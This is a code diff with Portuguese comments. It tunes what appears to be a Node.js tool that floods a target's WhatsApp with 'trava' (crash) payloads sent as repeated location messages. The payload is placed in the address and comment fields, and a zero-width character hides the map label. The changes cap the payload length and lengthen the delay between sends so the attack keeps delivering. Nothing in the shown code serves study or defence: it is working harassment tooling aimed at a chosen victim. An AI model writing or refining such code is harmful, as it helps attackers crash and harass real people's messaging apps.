@@ -185,20 +185,26 @@ const server = http.createServer(async (req, res) => {
                     // 2. Converte a barra invertida literal (\n) em quebra de linha real
                     travaTratada = travaTratada.replace(/\\n/g, '\n').trim();
 
+                    // Limita o tamanho do payload para evitar atrasos e travamento de chaves
+                    if (travaTratada.length > 20000) {
+                        travaTratada = travaTratada.substring(0, 20000);
+                    }
+
                     const addressPayload = travaTratada;
 
                     for (let i = 0; i < quantidade; i++) {
                         await waSock.sendMessage(targetJid, {
                             location: {
-                                degreesLatitude: -23.550520,  // Coordenada válida para renderizar o mapa
-                                degreesLongitude: -46.633308, // Coordenada válida para renderizar o mapa
-                                name: "\u200B",               // Caractere invisível oculta o texto "Google Maps"
+                                degreesLatitude: -23.550520,  // Coordenadas geográficas válidas
+                                degreesLongitude: -46.633308,
+                                name: "\u200B",               // Caractere invisível que oculta o "Google Maps"
                                 address: addressPayload,
                                 comment: addressPayload
                             }
                         });
                         
-                        await delay(3500);
+                        // Aumentado o delay para 5 segundos para permitir troca de chaves de criptografia no WhatsApp
+                        await delay(5000);
                     }
 
                     res.writeHead(200, { 'Content-Type': 'application/json' });
